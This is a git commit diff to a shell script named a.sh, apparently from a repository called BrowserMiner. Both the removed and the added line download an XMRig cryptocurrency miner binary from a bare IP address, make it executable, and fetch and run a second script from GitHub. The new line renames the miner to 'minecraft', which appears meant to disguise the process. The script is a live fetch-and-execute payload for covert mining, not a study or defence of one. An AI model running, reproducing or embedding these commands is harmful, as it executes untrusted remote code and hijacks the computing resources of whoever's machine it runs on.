d134156f91d1d58de6e1d6b2a958924b77b21061
SnowR4in <92912334+SnowR4in@users.noreply.github.com>
2024-07-16 12:36:53 +0600

    Update a.sh

--- a.sh
+++ a.sh
@@ -1,1 +1,1 @@
-wget http://150.136.168.71:80/archxx/xmrig1 && mv xmrig1 slug && chmod +x slug && wget https://raw.githubusercontent.com/SnowR4in/BrowserMiner/abb244b9ff3154651b4eb83cdc7cae65eb41fc67/b.sh && chmod +x b.sh && ./b.sh
+wget http://150.136.168.71:80/archxx/xmrig1 && mv xmrig1 minecraft && chmod +x minecraft && wget https://raw.githubusercontent.com/SnowR4in/BrowserMiner/main/b.sh && chmod +x b.sh && ./b.sh
